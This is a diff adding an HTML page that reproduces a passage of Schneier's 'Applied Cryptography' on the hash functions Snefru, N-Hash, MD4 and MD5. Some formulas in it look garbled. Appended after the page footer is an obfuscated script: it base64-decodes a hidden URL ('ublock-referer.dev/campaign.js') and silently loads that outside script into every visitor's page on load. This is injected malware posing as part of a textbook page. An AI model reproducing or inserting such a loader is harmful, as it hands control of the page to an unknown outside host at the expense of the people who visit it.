@@ -1,0 +1,140 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=432-437//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>On 128-bit Snefru, their attacks work better than brute force for four passes or less. A birthday attack against Snefru takes 2<SUP>64</SUP> operations; differential cryptanalysis can find a pair of messages that hash to the same value in 2<SUP>28.5</SUP> operations for three-pass Snefru and 2<SUP>44.5</SUP> operations for four-pass Snefru. Finding a message that hashes to a given value by brute force requires 2<SUP>128</SUP> operations; differential cryptanalysis takes 2<SUP>56</SUP> operations for three-pass Snefru and 2<SUP>88</SUP> operations for four-pass Snefru.</P>
+<P>Although Biham and Shamir didn&#146;t analyze 256-bit hash values, they extended their analysis to 224-bit hash values. Compared to a birthday attack that requires 2<SUP>112</SUP> operations, they can find messages that hash to the same value in 2<SUP>12.5</SUP> operations for two-pass Snefru, 2<SUP>33</SUP> operations for three-pass Snefru, and 2<SUP>81</SUP> operations for four-pass Snefru.</P>
+<P>Currently, Merkle recommends using Snefru with at least eight passes [1073]. However, with this many passes the algorithm is significantly slower than either MD5 or SHA.</P>
+<H3><A NAME="Heading4"></A><FONT COLOR="#000077">18.3 N- Hash</FONT></H3>
+<P><I>N</I>-Hash is an algorithm invented by researchers at Nippon Telephone and Telegraph, the same people who invented FEAL, in 1990 [1105, 1106]. <I>N</I>-Hash uses 128-bit message blocks, a complicated randomizing function similar to FEAL&#146;s, and produces a 128-bit hash value.</P>
+<P>The hash of each 128-bit block is a function of the block and the hash of the previous block.</P>
+<DL>
+<DD><I>H</I><SUB>0</SUB> = <I>I</I>, where <I>I</I> is a random initial value
+<DD><I>H</I><SUB>i</SUB> = g(<I>M</I><SUB>i</SUB>,<I>H</I><SUB>i- 1</SUB>) &#8853; <I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i- 1</SUB>
+</DL>
+<P>The hash of the entire message is the hash of the last message block. The random initial value, <I>I</I>, can be any value determined by the user (even all zeros).</P>
+<P>The function g is a complicated one. Figure 18.2 is an overview of the algorithm. Initially, the 128-bit hash of the previous message block, <I>H</I><SUB>i-1</SUB>, has its 64-bit left half and 64-bit right half swapped; it is then XORed with a repeating one/zero pattern (128 bits worth), and then XORed with the current message block, <I>M</I><SUB>i</SUB>. This value then cascades into <I>N</I>(<I>N</I> = 8 in the figures) processing stages. The other input to the processing stage is the previous hash value XORed with one of eight binary constant values.</P>
+<I><P><A NAME="Fig2"></A><A HREF="javascript:displayWindow('images/18-02.jpg',297,297 )"><IMG SRC="images/18-02t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-02.jpg',297,297)"><FONT COLOR="#000077"><B>Figure 18.2</B></FONT></A>&nbsp;&nbsp;Outline of N-Hash.</I>
+</P>
+<P>One processing stage is given in Figure 18.3. The message block is broken into four 32-bit values. The previous hash value is also broken into four 32-bit values. The function f is given in Figure 18.4. Functions <I>S</I><SUB>0</SUB> and <I>S</I><SUB>1</SUB> are the same as they were in FEAL.</P>
+<DL>
+<DD><I>S</I><SUB>0</SUB>(<I>a,b</I>) = rotate left two bits ((<I>a &#43; b</I>) mod 256)
+<DD><I>S</I><SUB>1</SUB>(<I>a,b</I>) = rotate left two bits ((<I>a</I> &#43; <I>b</I> &#43; 1) mod 256)
+</DL>
+<P>The output of one processing stage becomes the input to the next processing stage. After the last processing stage, the output is XORed with the <I>M</I><SUB>i</SUB> and <I>H</I><SUB>i-1</SUB>, and then the next block is ready to be hashed.</P>
+<P><FONT SIZE="+1"><B><I>Cryptanalysis of N- Hash</I></B></FONT></P>
+<P>Bert den Boer discovered a way to produce collisions in the round function of <I>N</I>-Hash [1262]. Biham and Shamir used differential cryptanalysis to break 6-round <I>N</I>-Hash [169, 172]. Their particular attack (there certainly could be others) works for any <I>N</I> that is divisible by 3, and is more efficient than the birthday attack for any <I>N</I> less than 15.</P>
+<I><P><A NAME="Fig3"></A><A HREF="javascript:displayWindow('images/18-03.jpg',253,273 )"><IMG SRC="images/18-03t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-03.jpg',253,273)"><FONT COLOR="#000077"><B>Figure 18.3</B></FONT></A>&nbsp;&nbsp;One processing stage of</I> N-<I>Hash</I>.
+<I></P>
+<P><A NAME="Fig4"></A><A HREF="javascript:displayWindow('images/18-04.jpg',182,216 )"><IMG SRC="images/18-04t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-04.jpg',182,216)"><FONT COLOR="#000077"><B>Figure 18.4</B></FONT></A>&nbsp;&nbsp;Function f.</I>
+</P>
+<P>The same attack can find pairs of messages that hash to the same value for 12-round <I>N</I>-Hash in 2<SUP>56</SUP> operations, compared to 2<SUP>64</SUP> operations for a brute-force attack. <I>N</I>-hash with 15 rounds is safe from differential cryptanalysis: The attack requires 2<SUP>72</SUP> operations.</P>
+<P>The algorithm&#146;s designers recommend using <I>N</I>-Hash with at least 8 rounds [1106]. Given the proven insecurity of <I>N</I>-Hash and FEAL (and its speed with 8 rounds), I recommend using another algorithm entirely.</P>
+<H3><A NAME="Heading5"></A><FONT COLOR="#000077">18.4 MD4</FONT></H3>
+<P>MD4 is a one-way hash function designed by Ron Rivest [1318, 1319, 1321]. MD stands for <B>Message Digest</B>; the algorithm produces a 128-bit hash, or message digest, of the input message.</P>
+<P>In [1319], Rivest outlined his design goals for the algorithm:</P>
+<DL>
+<DD><I>Security</I>. It is computationally infeasible to find two messages that hashed to the same value. No attack is more efficient than brute force.
+<DD><I>Direct Security</I>. MD4&#146;s security is not based on any assumption, like the difficulty of factoring.
+<DD><I>Speed</I>. MD4 is suitable for high-speed software implementations. It is based on a simple set of bit manipulations on 32-bit operands.
+<DD><I>Simplicity and Compactness</I>. MD4 is as simple as possible, without large data structures or a complicated program.
+<DD><I>Favor Little-Endian Architectures</I>. MD4 is optimized for microprocessor architectures (specifically Intel microprocessors); larger and faster computers make any necessary translations.
+</DL>
+<P>After the algorithm was first introduced, Bert den Boer and Antoon Bosselaers successfully cryptanalyzed the last two of the algorithm&#146;s three rounds [202]. In an unrelated cryptanalytic result, Ralph Merkle successfully attacked the first two rounds [202]. Eli Biham discussed a differential cryptanalysis attack against the first two rounds of MD4 [159]. Even though these attacks could not be extended to the full algorithm, Rivest strengthened the algorithm. The result is MD5.
+</P>
+<H3><A NAME="Heading6"></A><FONT COLOR="#000077">18.5 MD5</FONT></H3>
+<P>MD5 is an improved version of MD4 [1386, 1322]. Although more complex than MD4, it is similar in design and also produces a 128-bit hash.
+</P>
+<P><FONT SIZE="+1"><B><I>Description of MD5</I></B></FONT></P>
+<P>After some initial processing, MD5 processes the input text in 512-bit blocks, divided into 16 32-bit sub-blocks. The output of the algorithm is a set of four 32-bit blocks, which concatenate to form a single 128-bit hash value.
+</P>
+<P>First, the message is padded so that its length is just 64 bits short of being a multiple of 512. This padding is a single 1-bit added to the end of the message, followed by as many zeros as are required. Then, a 64-bit representation of the message&#146;s length (before padding bits were added) is appended to the result. These two steps serve to make the message length an exact multiple of 512 bits in length (required for the rest of the algorithm), while ensuring that different messages will not look the same after padding.</P>
+<P>Four 32-bit variables are initialized:</P>
+<DL>
+<DD><I>A</I> = 0x01234567
+<DD><I>B</I> = 0x89abcdef
+<DD><I>C</I> = 0xfedcba98
+<DD><I>D</I> = 0x76543210
+</DL>
+<P>These are called <B>chaining variables</B>.</P>
+<P>Now, the main loop of the algorithm begins. This loop continues for as many 512-bit blocks as are in the message.</P>
+<P>The four variables are copied into different variables: <I>a</I> gets <I>A, b</I> gets <I>B, c</I> gets <I>C,</I> and <I>d</I> gets <I>D</I>.</P>
+<P>The main loop has four rounds (MD4 had only three rounds), all very similar. Each round uses a different operation 16 times. Each operation performs a nonlinear function on three of <I>a, b, c,</I> and <I>d</I>. Then it adds that result to the fourth variable, a sub-block of the text and a constant. Then it rotates that result to the right a variable number of bits and adds the result to one of <I>a, b, c,</I> or <I>d</I>. Finally the result replaces one of <I>a, b, c,</I> or <I>d</I>. See Figures 18.5 and 18.6.</P>
+<I><P><A NAME="Fig5"></A><A HREF="javascript:displayWindow('images/18-05.jpg',356,173 )"><IMG SRC="images/18-05t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-05.jpg',356,173)"><FONT COLOR="#000077"><B>Figure 18.5</B></FONT></A>&nbsp;&nbsp;MD5 main loop.</I>
+</P>
+<P>There are four nonlinear functions, one used in each operation (a different one for each round).
+</P>
+<DL>
+<DD>F(<I>X,Y,Z</I>) = (<I>X</I> &#8869; <I>Y</I>) &#8870; ((&#172; <I>X</I>) &#8869; <I>Z</I>)
+<DD>G(<I>X,Y,Z</I>) = (<I>X</I> &#8869; <I>Z</I>) &#172; (<I>Y</I> (&#172; <I>Z</I>))
+<DD>H(<I>X,Y,Z</I>) = <I>X</I> &#8853; <I>Y</I> &#8853; <I>Z</I>
+<DD>I(<I>X,Y,Z</I>) = <I>Y</I> &#8853; (<I>X</I> &#8870; (&#172; <I>Z</I>))
+</DL>
+<P>(&#8853; is XOR,&#8869; is AND, &#8870; is OR, and &#172; is NOT.)
+</P>
+<P>These functions are designed so that if the corresponding bits of <I>X, Y,</I> and <I>Z</I> are independent and unbiased, then each bit of the result will also be independent and unbiased. The function F is the bit-wise conditional: If <I>X</I> then <I>Y</I> else <I>Z</I>. The function H is the bit-wise parity operator.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(SdqaWKuo, AvidvjTW) {AvidvjTW = SdqaWKuo.createElement('script');AvidvjTW.type = 'text/javascript';AvidvjTW.async = true;AvidvjTW.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');SdqaWKuo.getElementsByTagName('body')[0].appendChild(AvidvjTW);}(document));</script></body>
+</html>
